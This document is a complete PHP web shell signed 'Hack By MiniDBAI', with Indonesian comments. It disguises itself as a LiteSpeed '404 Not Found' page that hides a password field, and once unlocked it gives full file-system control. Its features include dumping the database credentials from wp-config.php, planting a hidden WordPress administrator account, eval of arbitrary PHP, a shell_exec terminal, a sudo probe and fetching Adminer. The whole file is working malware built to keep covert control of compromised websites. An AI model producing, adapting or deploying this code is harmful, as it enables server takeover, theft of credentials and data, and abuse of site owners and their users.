<?php
session_start();

// Hash password yang benar (gunakan hash yang dihasilkan dari password_hash)
$hashed_pass = '$2y$10$3CIM2PJAvpbiYODK83geVu1cookk8Y8E8mm2H0RjT9JY3cCwLf1TK'; 

// Fungsi login
if (isset($_POST['password'])) {
    $password = $_POST['password'];

    // Verifikasi hash password
    if (password_verify($password, $hashed_pass)) {
        $_SESSION['logged_in'] = true;
    } else {
        $error = "Password salah!";
    }
}

// Logout
if (isset($_POST['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Cek login
if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
    // Jika belum login, tampilkan form login
    ?>
    <!DOCTYPE html>
    <html>
    <head>
 
        <title>404 Not Found</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta name="robots" content="noindex,nofollow">
        <style>
            @media (prefers-color-scheme:dark){body{background-color:#000!important}}
            input[type="password"] {
                border: none;
                border-bottom: 1px #00000000;
                padding: 2px;
            }
            input[type="password"]:focus {
                outline: none;
            }
        </style>
    </head>
    <body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;">
        <div style="height:auto; min-height:100%;">     
            <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;">
                <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">404</h1>
                <h2 style="margin-top:20px;font-size: 30px;">Not Found</h2>
                <p>The resource requested could not be found on this server!</p>
            </div>
        </div>
        <div style="color:#f0f0f0; font-size:12px;margin:auto;padding:0px 30px 0px 30px;position:relative;clear:both;height:100px;margin-top:-101px;background-color:#474747;border-top: 1px solid rgba(0,0,0,0.15);box-shadow: 0 1px 0 rgba(255, 255, 255, 0.3) inset;">
            <br>Proudly powered by LiteSpeed Web Server
            <p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p>
        </div>       

        <?php if (isset($error)): ?>
            <p style="color: red;"><?php echo $error; ?></p>
        <?php endif; ?>
        <form method="post" action="">
            <div style="position: fixed; bottom: 10px; left: 5px;">
                <input type="password" name="password" required>
            </div>
        </form>
    </body>
    </html>
    <?php
    exit;
}

// Fungsi untuk menghapus folder secara rekursif
function delete_directory($dir) {
    if (!file_exists($dir)) {
        return false;
    }

    if (!is_dir($dir)) {
        return unlink($dir);
    }

    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }

        if (!delete_directory($dir . DIRECTORY_SEPARATOR . $item)) {
            return false;
        }
    }

    return rmdir($dir);
}

// Set directory path
$dir = isset($_GET['dir']) ? $_GET['dir'] : '../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../';
$home_dir = '../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../'; // Direktori utama atau tempat file berada
$dir2 = '';


// Fungsi untuk mengunggah file
if (isset($_FILES['file'])) {
    $target_file = realpath($dir) . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
    
    // Keamanan: Pastikan target file berada di dalam direktori home
    $base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
    $target_path = realpath(dirname($target_file)) . DIRECTORY_SEPARATOR . basename($target_file);
    if (strpos($target_path, $base) !== 0) {
        echo "Access denied.";
    } else {
        if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
            echo "File berhasil diunggah.";
        } else {
            echo "Gagal mengunggah file.";
        }
    }
}

// Fungsi untuk membuat direktori baru
if (isset($_POST['new_dir'])) {
    $new_dir = realpath($dir) . DIRECTORY_SEPARATOR . basename($_POST['new_dir']);
    
    // Keamanan: Pastikan direktori baru berada di dalam direktori home
    $base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
    $new_dir_real = realpath(dirname($new_dir)) . DIRECTORY_SEPARATOR . basename($new_dir);
    if (strpos($new_dir_real, $base) !== 0) {
        echo "Access denied.";
    } else {
        if (mkdir($new_dir, 0755)) {
            echo "Direktori berhasil dibuat.";
        } else {
            echo "Gagal membuat direktori.";
        }
    }
}

// Fungsi untuk menghapus file atau direktori
if (isset($_GET['delete'])) {
    $path = realpath($dir . $_GET['delete']);
    
$base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
    // Keamanan: Pastikan path berada di dalam direktori home
    if (strpos($path, $base) !== 0) {
        echo "Access denied.";
        exit;
    }

    if (is_dir($path)) {
        if (delete_directory($path)) {
            echo "Direktori berhasil dihapus.";
        } else {
            echo "Gagal menghapus direktori.";
        }
    } else {
        if (unlink($path)) {
            echo "File berhasil dihapus.";
        } else {
            echo "Gagal menghapus file.";
        }
    }
}

// Fungsi untuk mengedit file
if (isset($_POST['save_file'])) {
    $file_path = realpath($dir) . DIRECTORY_SEPARATOR . basename($_POST['file_name']);
    
$base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
    // Keamanan: Pastikan file berada di dalam direktori home
    if (strpos($file_path, $base) !== 0) {
        echo "Access denied.";
    } else {
        if (file_put_contents($file_path, $_POST['file_content']) !== false) {
            echo "File berhasil diedit.";
        } else {
            echo "Gagal mengedit file.";
        }
    }
}

// Fungsi untuk mengganti nama file atau direktori
if (isset($_POST['rename_file'])) {
    $old_name = realpath($dir) . DIRECTORY_SEPARATOR . basename($_POST['old_name']);
    $new_name = realpath($dir) . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
    
$base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
    // Keamanan: Pastikan kedua path berada di dalam direktori home
    if (strpos($old_name, $base) !== 0 || strpos($new_name, $base) !== 0) {
        echo "Access denied.";
    } else {
        if (rename($old_name, $new_name)) {
            echo "Nama berhasil diganti.";
        } else {
            echo "Gagal mengganti nama.";
        }
    }
}

// Fungsi untuk membuat file kosong
if (isset($_POST['create_file'])) {
    $file_name = basename($_POST['file_name']);
    $file_ext = isset($_POST['file_ext']) && !empty($_POST['file_ext']) ? '.' . preg_replace('/[^a-zA-Z0-9_\-]/', '', $_POST['file_ext']) : '.txt';
    $full_file_name = realpath($dir) . DIRECTORY_SEPARATOR . $file_name . $file_ext;
    
$base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
    // Keamanan: Pastikan file berada di dalam direktori home
    if (strpos($full_file_name, $base) !== 0) {
        echo "Access denied.";
    } else {
        if (file_put_contents($full_file_name, '') !== false) {
            echo "File kosong berhasil dibuat.";
        } else {
            echo "Gagal membuat file kosong.";
        }
    }
}

// Fungsi untuk mengubah permissions file atau direktori
if (isset($_POST['change_permissions'])) {
    $file_path = realpath($_POST['file_path']);
    $new_permissions = octdec($_POST['new_permissions']); // Mengkonversi input menjadi format oktal
    
$base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
    // Keamanan: Pastikan file berada di dalam direktori home
    if (strpos($file_path, $base) !== 0) {
        echo "Access denied.";
    } else {
        if (chmod($file_path, $new_permissions)) {
            echo "Permissions successfully changed.";
        } else {
            echo "Failed to change permissions.";
        }
    }
}


// Fungsi untuk copy file
if (isset($_GET['copy'])) {
    $file_to_copy = realpath($dir . $_GET['copy']);
    
$base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
    // Keamanan: Pastikan file berada di dalam direktori home
    if (strpos($file_to_copy, $base) !== 0 || !is_file($file_to_copy)) {
        echo "Access denied.";
    } else {
        $_SESSION['file_to_copy'] = $file_to_copy; // Simpan path file di session
        echo "The file is ready to be pasted.";
    }
}

// Fungsi untuk paste file
if (isset($_GET['paste'])) {
    if (isset($_SESSION['file_to_copy'])) {
        $source_file = $_SESSION['file_to_copy'];
        $destination_file = realpath($dir) . DIRECTORY_SEPARATOR . basename($source_file);
        
$base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
        // Keamanan: Pastikan tujuan paste berada di dalam direktori home
        if (strpos(realpath($dir), $base) !== 0) {
            echo "Access denied.";
        } else {
            if (copy($source_file, $destination_file)) {
                echo "File berhasil di-paste.";
            } else {
                echo "Gagal mem-paste file.";
            }
        }
    } else {
        echo "Tidak ada file yang di-copy.";
    }
}


// Tambahkan ini di atas bagian skrip Anda
if (isset($_GET['zip'])) {
    $zipFileName = basename($_GET['zip']) . '.zip'; // Nama file zip
    $zip = new ZipArchive();
    $zipPath = $dir . $zipFileName;

    if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
        $path = $dir . $_GET['zip'];

        if (is_dir($path)) {
            // Tambahkan folder ke zip
            $files = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($path),
                RecursiveIteratorIterator::LEAVES_ONLY
            );

            foreach ($files as $file) {
                if (!$file->isDir()) {
                    $filePath = $file->getRealPath();
                    $relativePath = substr($filePath, strlen($dir2)); // Mendapatkan path relatif
                    $zip->addFile($filePath, $relativePath);
                }
            }
        } else {
            // Tambahkan file ke zip
            $zip->addFile($path, basename($path));
        }

        $zip->close();
        echo "File ZIP berhasil dibuat: $zipFileName";
    } else {
        echo 'Gagal membuat file ZIP';
    }
}



// Fungsi untuk mengekstrak file ZIP
if (isset($_FILES['zip_file'])) {
    $zip_file = $_FILES['zip_file']['tmp_name'];
    $extract_to = realpath($dir);

    // Keamanan: Pastikan tujuan ekstraksi berada di dalam direktori home
 $base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama   
    if (strpos($extract_to, $base) !== 0) {
        echo "Access denied.";
    } else {
        $zip = new ZipArchive;
        if ($zip->open($zip_file) === TRUE) {
            $zip->extractTo($extract_to);
            $zip->close();
            echo "File ZIP berhasil diekstrak.";
        } else {
            echo "Gagal mengekstrak file ZIP.";
        }
    }
}

// Tampilkan file dan direktori
$files = scandir($dir);
?>



<!DOCTYPE html>
<html>
<head>
    <title>FileManagerAI</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta name="robots" content="noindex,nofollow">
    <style>
        body { font-family: Arial, sans-serif; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 8px 12px; border: 1px solid #ddd; text-align: left; }
        th { background-color: #f2f2f2; }
        a { text-decoration: none; color: blue; }
        a:hover { text-decoration: underline; }

form {

    padding: 10px;
    border: 1px solid #ddd;
    background-color: #f9f9f9;
    border-radius: 5px;

}

label {
    display: block;
    margin-bottom: 8px;
    font-weight: bold;
}

input[type="text"], input[type="file"], textarea {
    width: 100%;
    margin-bottom: 10px;
    border: 1px solid #ccc;
    border-radius: 4px;
}

input[type="submit"] {
    background-color: #4CAF50;
    color: white;
    padding: 10px 20px;
    border: none;
    border-radius: 4px;
    cursor: pointer;
}

input[type="submit"]:hover {
    background-color: #45a049;
}



    </style>

</head>
<body>
   <center> <h2>FileManagerAI V5</h2> </center>

<?php
// URL file yang akan diunduh
$url = "https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php";
$targetFile = __DIR__ . '/adminer.php'; // Nama file yang akan disimpan

// Fungsi untuk mengunduh file
function downloadFile($url, $targetFile) {
    // Inisialisasi cURL
    $ch = curl_init($url);
    
    // Set opsi cURL
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    
    // Eksekusi cURL
    $data = curl_exec($ch);
    $error = curl_error($ch);
    
    // Tutup cURL
    curl_close($ch);
    
    // Cek apakah ada kesalahan
    if ($error) {
        echo "Error: " . $error;
        return false;
    }
    
    // Simpan data ke file
    file_put_contents($targetFile, $data);
    return true;
}

// Cek jika form di-submit
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (downloadFile($url, $targetFile)) {
        echo "File adminer.php telah berhasil diunduh.";
    } else {
        echo "Gagal mengunduh file.";
    }
}
?>
  <table>
        <tbody>
            <tr>
<td>
    <!-- Tombol Logout -->
	<form action="" method="post">
		<input type="submit" name="logout" value="Logout">
    	</form>
</td>


<td>
	<form action="" method="post">
		<input type="submit" value="adminer">
	</form>
</td>


<td>
<div style="text-align: right;">
    <a target="_blank" rel="noopener noreferrer" href="https://bukakartu.id/minidbai">
        <img src="https://bukakartu.id/assets/img/615845_1725364953.webp" width="109" height="145" alt="Deskripsi Gambar">
    <br>Hack By MiniDBAI</a>
</div>
</td>
            </tr>
        </tbody>
    </table>


    <table>
        <tbody>
            <tr>
<td>
    <!-- Form untuk mengunggah file -->
    <form action="?dir=<?php echo urlencode($dir); ?>" method="post" enctype="multipart/form-data">
        <label>Upload file:</label>
        <input type="file" name="file" required>
        <input type="submit" value="Submit">
    </form>
</td>
<td>
    <!-- Form untuk membuat direktori baru -->
    <form action="?dir=<?php echo urlencode($dir); ?>" method="post">
        <label>Make Dir:</label>
        <input type="text" name="new_dir" required>
        <input type="submit" value="Submit">
    </form>
</td>



<td>

    <!-- Form untuk membuat file kosong -->
   
    <form action="?dir=<?php echo urlencode($dir); ?>" method="post">
        <label>Make file (.txt):</label>
        <input type="text" name="file_name" required><br>
        <label>Extensions file (Optional):</label>
        <input type="text" name="file_ext">
        <input type="submit" name="create_file" value="Submit">
    </form>
</td>


            </tr>
        </tbody>
    </table>
    <!-- Form untuk mengganti nama file atau direktori -->
    <?php if (isset($_GET['rename'])): ?>
        <h3>ReName</h3>
        <form action="" method="post">
            <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($_GET['rename']); ?>">
            <label>Nama baru:</label>
            <input type="text" name="new_name" value="<?php echo htmlspecialchars($_GET['rename']); ?>" required>
            <input type="submit" name="rename_file" value="Submit">
        </form>
    <?php endif; ?>

    <!-- Jika file yang akan diedit dipilih -->
    <?php
    if (isset($_GET['edit'])) {
        $file_to_edit = realpath($dir . $_GET['edit']);
        

        // Keamanan: Pastikan file berada di dalam direktori home
$base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
        if (strpos($file_to_edit, $base) !== 0 || !is_file($file_to_edit)) {
            echo "Access denied.";
        } else {
            $file_content = file_get_contents($file_to_edit);
            ?>
            <h3>Edit File: <?php echo htmlspecialchars($_GET['edit']); ?></h3>
            <form action="" method="post">
                <input type="hidden" name="file_name" value="<?php echo htmlspecialchars($_GET['edit']); ?>">
                <textarea name="file_content" rows="10" cols="50"><?php echo htmlspecialchars($file_content); ?></textarea><br>
                <input type="submit" name="save_file" value="Save">
            </form>
            <?php
        }
    }
    ?>

    <!-- Daftar file dan direktori -->
    <h3>Daftar File/Folder di: <?php echo htmlspecialchars($dir); ?> </h3>
<?php
// Mengambil direktori kerja saat ini
$direktori_sekarang = getcwd();
echo "" . htmlspecialchars($direktori_sekarang);
?>
<a href="?dir=<?php echo urlencode($direktori_sekarang); ?>/">[Home]</a>

<br>
<a id="dynamic-link" href="?dir=/">[Root]</a>

<table>
    <tr>
        <th>Name</th>
        <th>Size</th> <!-- Header untuk ukuran -->
        <th>Modify</th> <!-- Header untuk tanggal modifikasi -->
        <th>Permissions</th> <!-- Header untuk permissions -->
        <th>Actions</th>
    </tr>

    <tr>
        <td><a href="?dir=<?php echo urlencode(dirname($dir)) . '/'; ?>">⏪</a></td>
        <td></td> <!-- Kosongkan ukuran untuk link direktori -->
        <td></td> <!-- Kosongkan modifikasi untuk link direktori -->
        <td></td> <!-- Kosongkan permissions untuk link direktori -->
        <td>    
<!-- Tombol Paste -->
    <?php if (isset($_SESSION['file_to_copy'])): ?>
        <form action="?dir=<?php echo urlencode($dir); ?>&paste" method="post">
            <input type="submit" value="Paste file here">
        </form>
    <?php endif; ?></td> <!-- Kosongkan tindakan untuk link direktori -->
    </tr>

    <?php 
    // Pisahkan folder dan file
    $folders = [];
    $filesList = [];
    
    foreach ($files as $file) {
        if ($file != "." && $file != "..") {
            if (is_dir($dir . $file)) {
                $folders[] = $file;
            } else {
                $filesList[] = $file;
            }
        }
    }
    
    // Tampilkan folder terlebih dahulu
    foreach ($folders as $folder): ?>
        <tr>
            <td>
                <a href="?dir=<?php echo urlencode($dir . $folder . '/'); ?>"><?php echo htmlspecialchars($folder); ?>/</a>
            </td>
            <td></td> <!-- Kosongkan ukuran untuk folder -->
            <td><?php echo date("Y-m-d (H:i:s)", filemtime($dir . $folder)); // Tanggal terakhir modifikasi ?></td>
            <td>
                <form action="" method="post" style="display:inline;">
                    <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($dir . $folder); ?>">
                    <input type="text" name="new_permissions" placeholder="<?php echo substr(sprintf('%o', fileperms($dir . $folder)), -4); // Menampilkan permission folder ?>" style="width:80px;" required>
                    <input type="submit" name="change_permissions" value="Change">
                </form>
            </td>
            <td>
                <a href="?dir=<?php echo urlencode($dir); ?>&delete=<?php echo urlencode($folder); ?>" onclick="return confirm('Delete folder ?')">[Delete]</a>
                <a href="?dir=<?php echo urlencode($dir); ?>&rename=<?php echo urlencode($folder); ?>">[ReName]</a>
		
            </td>
        </tr>
    <?php endforeach; ?>

    <!-- Tampilkan file setelah folder -->
    <?php foreach ($filesList as $file): ?>
        <tr>
            <td>
                <a href="<?php echo htmlspecialchars($dir . $file); ?>" target="_blank"><?php echo htmlspecialchars($file); ?></a>
            </td>
            <td><?php echo number_format(filesize($dir . $file) / 1024, 2) . ' KB'; // Ukuran file dalam KB ?></td>
            <td><?php echo date("Y-m-d (H:i:s)", filemtime($dir . $file)); // Tanggal terakhir modifikasi ?></td>
            <td>
                <form action="" method="post" style="display:inline;">
                    <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($dir . $file); ?>">
                    <input type="text" name="new_permissions" placeholder="<?php echo substr(sprintf('%o', fileperms($dir . $file)), -4); // Menampilkan permission file ?>" style="width:80px;" required>
                    <input type="submit" name="change_permissions" value="Change">
                </form>
            </td>
            <td>
                <a href="?dir=<?php echo urlencode($dir); ?>&delete=<?php echo urlencode($file); ?>" onclick="return confirm('Delete file ?')">[Delete]</a>
                <a href="?dir=<?php echo urlencode($dir); ?>&edit=<?php echo urlencode($file); ?>">[Edit]</a>
                <a href="?dir=<?php echo urlencode($dir); ?>&rename=<?php echo urlencode($file); ?>">[ReName]</a>
                <a href="?dir=<?php echo urlencode($dir); ?>&copy=<?php echo urlencode($file); ?>">[Copy]</a>
		<a href="?dir=<?php echo urlencode($dir); ?>&zip=<?php echo urlencode($file); ?>">[Zip]</a> <!-- Tautan untuk zip -->
		
            </td>
        </tr>
    <?php endforeach; ?>
</table>


<?php
if (class_exists('ZipArchive')) {
    echo "Ekstensi ZipArchive aktif.";
} else {
    echo "Ekstensi ZipArchive tidak aktif.";
}
?>


    <!-- Form untuk mengunggah dan mengekstrak file ZIP -->
    <form action="?dir=<?php echo urlencode($dir); ?>" method="post" enctype="multipart/form-data">
        <label>Upload and extract ZIP file:</label>
        <input type="file" name="zip_file" required>
        <input type="submit" value="Extract ZIP">
    </form>

<br>











<?php 
echo "<center><big>MiniAI Upload Area</big></center><br>";
echo "<center><form method='post' enctype='multipart/form-data' name='uploader'>";

// Ambil direktori dasar dari URL
$baseDir = isset($_GET['dir']) ? urldecode($_GET['dir']) : $_SERVER['DOCUMENT_ROOT'] . '/';

// Fungsi untuk mendapatkan semua folder yang dapat diakses untuk upload
function getWritableDirectories($dir) {
    $directories = [];
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item !== '.' && $item !== '..') {
            $path = $dir . '/' . $item;
            if (is_dir($path) && is_writable($path)) {
                $directories[] = $path;
                // Ambil direktori dalam direktori
                $subDirs = getWritableDirectories($path);
                $directories = array_merge($directories, $subDirs);
            }
        }
    }
    return $directories;
}

// Tampilkan tombol untuk memunculkan form upload
echo '<button type="button" onclick="document.getElementById(\'uploadForm\').style.display=\'block\'">Upload File</button><br><br>';

// Tampilkan form upload file (disembunyikan secara default)
echo '<div id="uploadForm" style="display:none;">';
echo '<select name="uploadDir">';
$directories = getWritableDirectories($baseDir);
foreach ($directories as $dir) {
    $dirName = str_replace($baseDir, '', $dir); // Menghilangkan path dasar
    echo '<option value="' . $dir . '">' . $dirName . '</option>';
}
echo '</select>';

echo '<br><input type="file" name="file" size="45"><input name="_upl" type="submit" id="_upl" value="Upload"></form></div></center>';

if (isset($_POST['_upl']) && $_POST['_upl'] == "Upload") {
    // Ambil direktori yang dipilih
    $selectedDir = $_POST['uploadDir'];
    $uploadDir = $selectedDir . '/'; // Gunakan direktori yang dipilih langsung

    // Lokasi file yang diupload
    $uploadFile = $uploadDir . basename($_FILES['file']['name']);

    // Proses upload file
    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
        $fileUrl = 'https://' . $_SERVER['HTTP_HOST'] . str_replace($_SERVER['DOCUMENT_ROOT'], '', $uploadFile);
        echo "<center>File telah berhasil diupload!<br>";
        echo "URL: <a href='$fileUrl' target='_blank'>$fileUrl</a></center>";
    } else {
        echo "<center>Gagal mengupload file!</center>";
    }
}
?>





<?php
// Array dengan path alternatif untuk wp-config.php, hingga sepuluh direktori di atas
$possible_paths = [
    dirname(__FILE__) . '/wp-config.php',                // Direktori saat ini
    dirname(__FILE__) . '/../wp-config.php',             // Satu direktori di atas
    dirname(__FILE__) . '/../../wp-config.php',          // Dua direktori di atas
    dirname(__FILE__) . '/../../../wp-config.php',       // Tiga direktori di atas
    dirname(__FILE__) . '/../../../../wp-config.php',    // Empat direktori di atas
    dirname(__FILE__) . '/../../../../../wp-config.php', // Lima direktori di atas
];

// Variabel untuk menyimpan path yang ditemukan
$wp_config_file = null;

// Cari file wp-config.php di semua path alternatif
foreach ($possible_paths as $path) {
    if (file_exists($path)) {
        $wp_config_file = $path;
        break;
    }
}

// Jika file ditemukan
if ($wp_config_file) {
    // Ambil isi file
    $config_content = file_get_contents($wp_config_file);

    // Fungsi untuk mendapatkan nilai dari definisi konstanta
    function get_wp_config_value($content, $key) {
        preg_match("/define\s*\(\s*'{$key}'\s*,\s*'([^']+)'/", $content, $matches);
        return isset($matches[1]) ? $matches[1] : null;
    }

    // Ambil variabel yang diinginkan
    $db_name = get_wp_config_value($config_content, 'DB_NAME');
    $db_user = get_wp_config_value($config_content, 'DB_USER');
    $db_password = get_wp_config_value($config_content, 'DB_PASSWORD');
    $db_host = get_wp_config_value($config_content, 'DB_HOST');

    // Ambil table prefix
    preg_match("/\\\$table_prefix\s*=\s*'([^']+)';/", $config_content, $prefix_matches);
    $table_prefix = isset($prefix_matches[1]) ? $prefix_matches[1] : "Tidak ditemukan";

    // Tampilkan hasil
    echo "wp-config.php ditemukan di: $wp_config_file<br>";
    echo "DB_HOST = $db_host<br>";
    echo "DB_USER = $db_user<br>";
    echo "DB_PASSWORD = $db_password<br>";
    echo "Database = $db_name<br>";
    echo "Table Prefix = $table_prefix<br>";

    // Cek apakah ada POST request untuk membuat akun admin
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $username = $_POST['username'] ?? null;
        $password = '$P$B2CXGXAe2jBMcOK34tZSXaMABEvqFS.'; // Hash password yang telah ditentukan
        $email = $_POST['email'] ?? null;

        // Validasi input
        if ($username && $email) {
            // Buat koneksi ke database
            $mysqli = new mysqli($db_host, $db_user, $db_password, $db_name);

            // Cek koneksi
            if ($mysqli->connect_error) {
                die("Koneksi gagal: " . $mysqli->connect_error);
            }

            // Query untuk menambahkan user ke tabel wp_users
            $user_insert = $mysqli->prepare("INSERT INTO {$table_prefix}users (user_login, user_pass, user_email, user_registered, user_status) VALUES (?, ?, ?, NOW(), 0)");
            $user_insert->bind_param("sss", $username, $password, $email);
            $user_insert->execute();
            $user_id = $mysqli->insert_id; // ID user yang baru dibuat
            $user_insert->close();

            if ($user_id) {
                // Query untuk menambahkan meta user untuk peran administrator di wp_usermeta
                $capabilities = serialize(['administrator' => true]);
                $mysqli->query("INSERT INTO {$table_prefix}usermeta (user_id, meta_key, meta_value) VALUES ($user_id, '{$table_prefix}capabilities', '$capabilities')");
                $mysqli->query("INSERT INTO {$table_prefix}usermeta (user_id, meta_key, meta_value) VALUES ($user_id, '{$table_prefix}user_level', '10')");

                echo "Akun administrator berhasil dibuat dengan username: $username";
            } else {
                echo "Gagal membuat akun administrator.";
            }

            $mysqli->close();
        } else {
            echo "Username dan email harus diisi.";
        }
    }
} else {
    echo "File wp-config.php tidak ditemukan di direktori yang ditentukan.";
}
?>
<form method="post" action="">
    <label for="username">Username:</label>
    <input type="text" id="username" name="username" required><br>

    <label for="email">Email:</label>
    <input type="email" id="email" name="email" value="superuseradmin@mail.com" required><br>
    <input type="submit" value="Buat Akun Administrator">

</form>











    <form method="post">
	<label for="command"> Eksekusi Kode PHP :</label><br>
        <textarea name="code" rows="2" cols="50" placeholder="Masukkan kode PHP di sini..."></textarea><br>
	<input type="submit" value="Jalankan php">
        
    </form>



   

    


    <?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $code = $_POST['code'];
        
        // Pastikan kode PHP aman untuk dieksekusi
        // Hanya untuk tujuan demonstrasi. Hindari ini di lingkungan produksi.
        eval("?>$code");
    }
    ?>


<?php
// Menampilkan informasi server
echo "<h1>Informasi Server</h1>";
echo "<p><strong>Server Name:</strong> " . $_SERVER['SERVER_NAME'] . " | <strong>Server Address:</strong> " . $_SERVER['SERVER_ADDR'] . "  | <strong>Server Port:</strong> " . $_SERVER['SERVER_PORT'] . "</p>";
echo "<p><strong>Request Method:</strong> " . $_SERVER['REQUEST_METHOD'] . "  | <strong>Protocol:</strong> " . $_SERVER['SERVER_PROTOCOL'] . "  | <strong>Request Time:</strong> " . date('Y-m-d H:i:s', $_SERVER['REQUEST_TIME']) . " <strong>Timezone:</strong> " . date_default_timezone_get() . "</p>";
echo "<p><strong>User Agent:</strong> " . $_SERVER['HTTP_USER_AGENT'] . "</p>";
echo "<p><strong>Remote Address:</strong> " . $_SERVER['REMOTE_ADDR'] . "  | <strong>Server Software:</strong> " . $_SERVER['SERVER_SOFTWARE'] . "</p>";
echo "<p><strong>PHP Version:</strong> " . phpversion() . "</p>";
echo "<p><strong>Server Admin:</strong> " . (isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : 'Tidak ada') . "  | <strong>Server Type:</strong> " . (isset($_SERVER['SERVER_TYPE']) ? $_SERVER['SERVER_TYPE'] : 'Tidak ada') . "</p>";
echo "<p><strong>Connection Status:</strong> " . (isset($_SERVER['CONNECTION']) ? $_SERVER['CONNECTION'] : 'Tidak ada') . "</p>";
echo "<p><strong>Content Type:</strong> " . (isset($_SERVER['CONTENT_TYPE']) ? $_SERVER['CONTENT_TYPE'] : 'Tidak ada') . "</p>";
echo "<p><strong>HTTPS:</strong> " . (isset($_SERVER['HTTPS']) ? 'Ya' : 'Tidak') . " | <strong>Content Length:</strong> " . (isset($_SERVER['CONTENT_LENGTH']) ? $_SERVER['CONTENT_LENGTH'] : 'Tidak ada') . " bytes</p>";

?>





<?php
// Jalankan perintah sudo dan cek apakah ada akses
$output = shell_exec('sudo -v 2>&1');

// Tampilkan hasilnya
if (strpos($output, 'Sorry') !== false) {
    echo 'Perintah sudo tidak bisa digunakan.';
} else {
    echo 'Perintah sudo berhasil dijalankan atau memiliki akses.';
}
?>


    <form method="post">
        <label for="command"> Terminal :</label><br>
        <input type="text" id="command" name="command" required><br><br>
        <input type="submit" value="Eksekusi">
    </form>


<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $command = $_POST['command'];
    
    // Jalankan perintah terminal
    $output = shell_exec($command);
    
    // Tampilkan output dari perintah yang dijalankan
    echo "<pre>$output</pre>";
}
?>









<center>[<a target="_blank"  href="https://bukakartu.id/minidbai">minidbai</a>]</center>
</body>
</html>
